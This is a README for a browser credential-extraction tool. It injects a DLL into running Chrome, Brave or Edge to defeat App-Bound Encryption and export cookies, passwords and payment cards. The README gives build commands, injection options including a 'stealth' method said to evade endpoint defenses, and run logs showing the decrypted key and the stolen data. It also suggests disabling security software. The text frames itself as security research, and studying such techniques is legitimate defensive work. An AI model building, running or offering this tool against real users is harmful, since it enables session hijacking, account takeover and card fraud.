# Chrome App-Bound Encryption Decryption

## 🔍 Overview

Fully decrypt **App-Bound Encrypted (ABE)** cookies, passwords & payment methods from Chromium-based browsers (Chrome, Brave, Edge) — all in user mode, no admin rights required.

If you find this useful, I’d appreciate a coffee:  
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M61EP5XL)

## 🛡️ Background

Starting in **Chrome 127+**, Google added App-Bound Encryption to strengthen local data:

1. **Key generation**: a per-profile AES-256-GCM key is created and wrapped by Windows DPAPI.
2. **Storage**: that wrapped key (Base64-encoded, prefixed with `APPB`) lands in your **Local State** file.
3. **Unwrapping**: Chrome calls the **IElevator** COM server, but **only** if the caller’s EXE lives in the browser’s install directory.

These path-validation checks prevent any external tool — even with direct DPAPI access — from unwrapping the ABE key.

## 🚀 How It Works

**This project** injects a tiny DLL into the running browser process (via `CreateRemoteThread` or `NtCreateThreadEx`), which then:

- **Runs from inside** the browser’s address space (satisfies IElevator’s install-folder check)
- **Invokes** the IElevator COM interface directly to unwrap the ABE key
- **Uses** that key to decrypt cookies, passwords and payment data — all in user land, no elevation needed

## 🔬 In-Depth Technical Analysis & Research

For a comprehensive understanding of Chrome's App-Bound Encryption, the intricacies of its implementation, the detailed mechanics of this tool's approach, and a broader discussion of related security vectors, please refer to my detailed research paper:

1.  ➡️ **[Chrome App-Bound Encryption (ABE) - Technical Deep Dive & Research Notes](RESEARCH.md)**

    This document covers:
    * The evolution from DPAPI to ABE.
    * A step-by-step breakdown of the ABE mechanism, including `IElevator` COM interactions and key wrapping.
    * Detailed methodology of the DLL injection strategy used by this tool.
    * Analysis of encrypted data structures and relevant Chromium source code insights.
    * Discussion of alternative decryption vectors and Chrome's evolving defenses.

2.  ➡️ **[The Curious Case of the Cantankerous COM: Decrypting Microsoft Edge's App-Bound Encryption](The_Curious_Case_of_the_Cantankerous_COM_Decrypting_Microsoft_Edge_ABE.md)**
    This article details the specific challenges and reverse engineering journey undertaken to achieve reliable ABE decryption for Microsoft Edge. It includes:
    *   An account of the initial issues and misleading error codes (`E_INVALIDARG`, `E_NOINTERFACE`).
    *   The process of using COM type library introspection (with Python `comtypes`) to uncover Edge's unique `IElevatorEdge` vtable structure and inheritance.
    *   How this insight led to tailored C++ interface stubs for successful interaction with Edge's ABE service.
    *   A practical look at debugging tricky COM interoperability issues.

### ⚙️ Key Features

- 🔓 Full user-mode decryption & JSON export of cookies, passwords & payment methods
- 🚧 Stealth DLL injection to bypass path checks & common endpoint defenses
- 🌐 Works on **Google Chrome**, **Brave** & **Edge** (x64 & ARM64)
- 🛠️ No admin privileges required

![image](https://github.com/user-attachments/assets/ec899d96-6a95-42b8-8af1-650adb52a9aa)


## 📦 Supported & Tested Versions

| Browser            | Tested Version (x64 & ARM64) |
| ------------------ | ---------------------------- |
| **Google Chrome**  | 136.0.7103.93                |
| **Brave**          | 1.78.97 (136.0.7103.93)      |
| **Microsoft Edge** | 136.0.3240.64                |

> [!NOTE]  
> The injector requires the target browser to be **running** unless you use `--start-browser`.

## 🔧 Build Instructions

1. **Clone** the repository and open a _Developer Command Prompt for VS_ (or any MSVC‑enabled shell).

2. **Prepare SQLite Amalgamation**

   1. Download the [SQLite “autoconf” amalgamation](https://www.sqlite.org/download.html) and place `sqlite3.c` and `sqlite3.h` into your project root.

   2. In a **Developer Command Prompt for VS** run:

   ```bash
   cl /nologo /W3 /O2 /MT /c sqlite3.c
   lib /nologo /OUT:sqlite3.lib sqlite3.obj
   ```

   This produces a `sqlite3.lib` you can link into the DLL.

3. **Compile the DLL** (responsible for the decryption logic):

   ```bash
   cl /EHsc /std:c++17 /LD /O2 /MT chrome_decrypt.cpp sqlite3.lib bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /link /OUT:chrome_decrypt.dll
   ```

4. **Compile the injector** (responsible for DLL injection & console UX):

   ```bash
   cl /EHsc /O2 /std:c++17 /MT chrome_inject.cpp version.lib ntdll.lib shell32.lib /link /OUT:chrome_inject.exe
   ```

Both artifacts (`chrome_inject.exe`, `chrome_decrypt.dll`) must reside in the same folder.

## 🚀 Usage

```bash
PS> .\chrome_inject.exe [options] <chrome|brave|edge>
```

### Options

Options

- `--method load|nt`
  Injection method:

  - load = CreateRemoteThread + LoadLibrary (default)
  - nt = NtCreateThreadEx stealth injection

- `--start-browser`
  Auto-launch the browser if it’s not already running.

- `--verbose`
  Enable extensive debugging output.

### Examples

```bash
# Standard load-library injection:
PS> .\chrome_inject.exe chrome

# Use stealth NtCreateThreadEx method:
PS> .\chrome_inject.exe --method nt chrome

# Auto-start Brave and show debug logs:
PS> .\chrome_inject.exe --method load --start-browser --verbose brave
```

#### Normal Run

```bash
PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome_inject.exe chrome --start-browser --method nt
------------------------------------------------
|  Chrome App-Bound Encryption Decryption      |
|  Multi-Method Process Injector               |
|  Cookies / Passwords / Payment Methods       |
|  v0.8.0 by @xaitax                           |
------------------------------------------------

[*] Chrome not running, launching...
[+] Chrome (v. 136.0.7103.93) launched w/ PID 17576
[+] DLL injected via NtCreateThreadEx stealth
[*] Waiting for DLL decryption tasks to complete (max 60s)...
[+] DLL signaled completion.

[+] COM library initialized (APARTMENTTHREADED).
[+] IElevator instance created for Chrome.
[+] Proxy blanket set (PKT_PRIVACY, IMPERSONATE, DYNAMIC_CLOAKING).
[+] Attempting to read Local State path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
[+] Finished Base64 decoding with API (1224 bytes).
[+] Encrypted key header is valid.
[+] Encrypted key blob from Local State (1220 bytes).
[+] Encrypted key (preview): 01000000d08c9ddf0115d1118c7a00c0...
[+] IElevator -> DecryptData successful. Decrypted key length: 32
[+] Decrypted AES key (hex) saved to: C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
[+] Decrypted AES Key (hex): 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
[*] 8 Cookies extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_cookies.txt
[*] 1 Passwords extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_passwords.txt
[*] 1 Payment methods extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_payments.txt
[*] Chrome data decryption process finished for Chrome.
[*] Unloading DLL and exiting worker thread.
[*] Chrome terminated by injector.
```

#### Verbose

```bash
PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome_inject.exe chrome --start-browser --method nt --verbose
------------------------------------------------
|  Chrome App-Bound Encryption Decryption      |
|  Multi-Method Process Injector               |
|  Cookies / Passwords / Payment Methods       |
|  v0.8.0 by @xaitax                           |
------------------------------------------------

[#] Verbose mode enabled.
[#] CleanupPreviousRun: attempting to remove temp files
[#] Deleting C:\Users\ah\AppData\Local\Temp\chrome_decrypt.log
[#] Deleting C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
[#] HandleGuard: acquired handle 188
[#] Created completion event: Global\ChromeDecryptWorkDoneEvent
[#] Target: Chrome, Process: chrome.exe, Default Exe: C:\Program Files\Google\Chrome\Application\chrome.exe
[#] GetProcessIdByName: snapshotting processes for chrome.exe
[#] HandleGuard: acquired handle 180
[#] GetProcessIdByName: Process chrome.exe not found.
[#] HandleGuard: closing handle 180
[*] Chrome not running, launching...
[#] StartBrowserAndWait: attempting to launch: C:\Program Files\Google\Chrome\Application\chrome.exe
[#] HandleGuard: acquired handle 224
[#] HandleGuard: acquired handle 220
[#] Browser main thread handle: 220
[#] Browser process handle: 224
[#] Waiting 3s for browser to initialize...
[#] Browser started PID=6512
[#] HandleGuard: closing handle 220
[#] HandleGuard: closing handle 224
[#] Retrieving version info for: C:\Program Files\Google\Chrome\Application\chrome.exe
[#] Version query successful: 136.0.7103.93
[+] Chrome (v. 136.0.7103.93) launched w/ PID 6512
[#] Opening process PID=6512
[#] HandleGuard: acquired handle 220
[#] IsWow64Process2: processMachine=Unknown, nativeMachine=ARM64, effectiveArch=ARM64
[#] Architecture match: Injector=ARM64, Target=ARM64
[#] GetDllPath: DLL path determined as: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
[#] DLL path: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
[#] InjectWithNtCreateThreadEx: begin for DLL: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
[#] ntdll.dll base=140716223889408
[#] NtCreateThreadEx addr=140716223896768
[#] VirtualAllocEx size=87
[#] WriteProcessMemory complete for DLL path to remote address: 2670231552000
[#] Calling NtCreateThreadEx with LoadLibraryA at 140716207975648
[#] HandleGuard: acquired handle 224
[#] NtCreateThreadEx returned status 0, thread handle=224
[#] Waiting for remote LoadLibraryA thread (NtCreateThreadEx) to complete (max 15s)...
[#] Remote LoadLibraryA thread (NtCreateThreadEx) finished.
[#] InjectWithNtCreateThreadEx: done
[#] HandleGuard: closing handle 224
[+] DLL injected via NtCreateThreadEx stealth
[*] Waiting for DLL decryption tasks to complete (max 60s)...
[+] DLL signaled completion.
[#] Attempting to display log file: C:\Users\ah\AppData\Local\Temp\chrome_decrypt.log

[+] COM library initialized (APARTMENTTHREADED).
[+] IElevator instance created for Chrome.
[+] Proxy blanket set (PKT_PRIVACY, IMPERSONATE, DYNAMIC_CLOAKING).
[+] Attempting to read Local State path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
[+] Finished Base64 decoding with API (1224 bytes).
[+] Encrypted key header is valid.
[+] Encrypted key blob from Local State (1220 bytes).
[+] Encrypted key (preview): 01000000d08c9ddf0115d1118c7a00c0...
[+] IElevator -> DecryptData successful. Decrypted key length: 32
[+] Decrypted AES key (hex) saved to: C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
[+] Decrypted AES Key (hex): 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
[*] 8 Cookies extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_cookies.txt
[*] 1 Passwords extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_passwords.txt
[*] 1 Payment methods extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_payments.txt
[*] Chrome data decryption process finished for Chrome.
[*] Unloading DLL and exiting worker thread.
[#] Terminating browser PID=6512 because injector started it.
[#] HandleGuard: acquired handle 224
[*] Chrome terminated by injector.
[#] HandleGuard: closing handle 224
[#] Injector finished.
[#] HandleGuard: closing handle 220
[#] HandleGuard: closing handle 188
```

## 📂 Data Extraction

Once decryption completes, three JSON files are emitted into your Temp folder:

- 🍪 **Cookies:** `%TEMP%\<Browser>_decrypt_cookies.txt`
- 🔑 **Passwords:** `%TEMP%\<Browser>_decrypt_passwords.txt`
- 💳 **Payment Methods:** `%TEMP%\<Browser>_decrypt_payments.txt`

### 🍪 Cookie Extraction

Each cookie file is a JSON array of objects:

```json
[
  {
    "host": "accounts.google.com",
    "name": "ACCOUNT_CHOOSER",
    "value": "AFx_qI781-…"
  },
  {
    "host": "mail.google.com",
    "name": "OSID",
    "value": "g.a000uwj5ufIS…"
  },
  …
]
```

### 🔑 Password Extraction

Each password file is a JSON array of objects:

```json
[
  {
    "origin": "https://example.com/login",
    "username": "user@example.com",
    "password": "••••••••••"
  },
  {
    "origin": "https://another.example.com",
    "username": "another_user",
    "password": "••••••••••"
  }
  …
]
```

### 💳 Payment Method Extraction

Each payment file is a JSON array of objects:

```json
[
  {
    "name_on_card": "John Doe",
    "expiration_month": 12,
    "expiration_year": 2030,
    "card_number": "••••••••••1234",
    "cvc": "•••"
  },
  {
    "name_on_card": "Jane Smith",
    "expiration_month": 07,
    "expiration_year": 2028,
    "card_number": "••••••••••5678",
    "cvc": "•••"
  }
  …
]
```

## ⚠️ Potential Issues & Errors

### `DecryptData failed. HRESULT: 0x8004a003. Last COM Error: 8009000b. Decrypted BSTR is null.`

If you encounter this error message from the DLL's log output, it indicates a failure within Chrome's internal decryption mechanism, specifically when calling the `IElevator::DecryptData` COM method.

Let's break down the error codes:

*   **`HRESULT: 0x8004a003`**: This is the COM error code `EPT_S_NOT_REGISTERED`. It typically means that a necessary RPC (Remote Procedure Call) endpoint that the `IElevator` COM object relies upon could not be found, was not registered, or there was an issue with inter-process communication. This could be a primary cause or a contributing factor preventing the `IElevator` object from functioning correctly.
*   **`Last COM Error: 0x8009000b`** (hexadecimal for `2148073483`): This is the Windows Cryptography API error `NTE_BAD_KEY_STATE` (“Key not valid for use in specified state”). This means DPAPI (the Windows Data Protection API) couldn’t decrypt the wrapped AES-GCM key stored in Chrome’s `Local State` file. The key was likely inaccessible or considered invalid *from the context or state in which the `IElevator` object was trying to use it*.

The `EPT_S_NOT_REGISTERED` error might prevent the `IElevator` from establishing the correct operational context or from communicating with other necessary Chrome components, which in turn leads to the `NTE_BAD_KEY_STATE` when it attempts the actual cryptographic decryption.

#### Common Causes
Many of these relate to the conditions required for DPAPI to successfully operate:

*   When you change your Windows logon password, Windows re-wraps your DPAPI master key under the new password. If the old key can’t be decrypted (e.g., because the system wasn't properly online to sync, or a cached credential issue), any older data blobs protected by it might fail to decrypt until a successful re-encryption cycle.
*   DPAPI keys are tied to a specific user profile on a specific machine. Attempting to decrypt data from a Chrome profile copied from another user account or another computer will fail.
*   If you run the injector as **Administrator** (or as the `SYSTEM` account) targeting a Chrome process running as a standard, non-elevated user, DPAPI will likely refuse the decryption. The security context for decryption must match that of the user who originally encrypted the data. The `IElevator` object itself has specific context requirements.
*   The user's DPAPI master keys are stored in `%APPDATA%\Microsoft\Protect\{SID}` (where `{SID}` is the user's Security Identifier). If this folder is missing, corrupted, or its permissions are incorrect, DPAPI cannot access the necessary keys.
*   The `IElevator` COM interface and its underlying RPC mechanisms are internal to Chrome. Google can modify their behavior, requirements, or even how they are registered with any Chrome update. This tool might be incompatible with the specific Chrome version you are targeting.
*   Antivirus, EDR (Endpoint Detection and Response), or other security software might be interfering with the COM/RPC communications, the DLL's ability to interact with `IElevator`, or its access to cryptographic functions and resources.

#### Work-around / Notes
*   Ensure the injector is run from the *same interactive user account* that owns the Chrome profile and at the *same privilege level* as the target Chrome processes (usually non-elevated).
*   After a Windows password change, logging off and back on can help ensure DPAPI has correctly re-synchronized and re-encrypted necessary keys.
*   Ensure the Chrome profile folder (`%LOCALAPPDATA%\Google\Chrome\User Data\`) has not been moved, restored from a backup from another system/user, or had its DPAPI-related files tampered with.
*   The tool's success can be highly dependent on the Chrome version. Check if this tool version is known to work with your installed Chrome version.
*   To rule out interference, you might *temporarily* disable security software. Re-enable it immediately after testing.
*   Chrome has an internal recovery mechanism (`IElevator::RunRecoveryCRXElevated(...)`) that can re-wrap keys if DPAPI fails, but not implemented by this tool to avoid providing an easy bypass for malware.

## 🆕 Changelog

### v0.8

- **New**: **Reliable Microsoft Edge Decryption:** Implemented support for Edge's native App-Bound Encryption COM interface (`IElevatorEdge`), resolving previous inconsistencies and removing dependency on Brave Browser being installed. This involved detailed COM interface analysis and tailored C++ stubs for Edge's specific vtable layout.

### v0.7

- **New**: Implemented Kernel Named Events for flawless timing between Injector and DLL operations.
- **Improved**: Major refactoring of both Injector and DLL for enhanced stability, performance, and maintainability.
- **Improved**: Strict RAII implemented for all system resources (Handles, COM, SQLite) to prevent leaks.
- **Improved**: More accurate and immediate error code capture and reporting.
- **Improved**: Adaptive Locking Bypass / Enhanced Locked File Access (SQLite nolock=1 for Login Data/Payment Methods)
- **Improved**: Dynamic Path Resolution / Dynamic Path Discovery (modern Windows APIs)
- **Improved**: Optimized DLL's browser termination logic.

### v0.6

- **New**: Full Username & Password extraction
- **New**: Full Payment Information (e.g., Credit Card) extraction

### v0.5

- **New**: Full Cookie extraction into JSON format

### v0.4

- **New**: selectable injection methods (`--method load|nt`)
- **New**: auto‑start the browser if not running (`--start-browser`)
- **New**: verbose debug output (`--verbose`)
- **New**: automatically terminate the browser after decryption
- **Improved**: Injector code refactoring

Further Links:

- [Google Security Blog](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [Chrome app-bound encryption Service](https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view)
- [snovvcrash](https://x.com/snovvcrash)
- [SilentDev33](https://github.com/SilentDev33/ChromeAppBound-key-injection)

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Disclaimer

> [!WARNING]  
> This tool is intended for cybersecurity research and educational purposes. Ensure compliance with all relevant legal and ethical guidelines when using this tool.
